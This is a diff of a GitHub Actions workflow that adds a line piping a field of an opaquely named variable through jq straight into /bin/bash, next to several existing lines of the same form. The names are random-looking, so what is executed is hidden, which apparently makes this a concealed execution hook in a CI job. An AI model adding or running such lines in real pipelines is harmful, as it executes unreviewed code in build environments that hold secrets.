@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$orq8" | jq -r .ftds8 | /bin/bash
           printf '%s' "$vrm01454" | jq -r .jw4485 | /bin/bash
           echo $omh00 | jq -r .xn31363 | /bin/bash
+          echo $hzl22234 | jq -r .toet276 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
